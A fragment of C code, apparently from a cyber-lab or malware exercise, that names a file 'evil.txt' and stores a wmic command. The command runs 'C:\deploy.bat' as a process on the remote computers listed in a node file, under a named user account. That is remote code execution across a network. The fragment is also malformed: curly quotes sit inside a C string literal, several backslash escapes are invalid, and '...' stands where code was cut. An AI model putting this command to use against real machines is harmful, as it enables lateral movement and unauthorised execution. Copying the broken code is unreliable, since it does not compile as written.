...
int main()
{
	...
	const char* filename = "c:\\Users\\saurav\\Temp\\evil.txt";
    const char* filecontent = "wmic /user:“saurav@cyberlab.com” /node:@\“c:\Scripts\Apps\computer.txt\” process call ‘C:\deploy.bat’ /nointeractive\"";
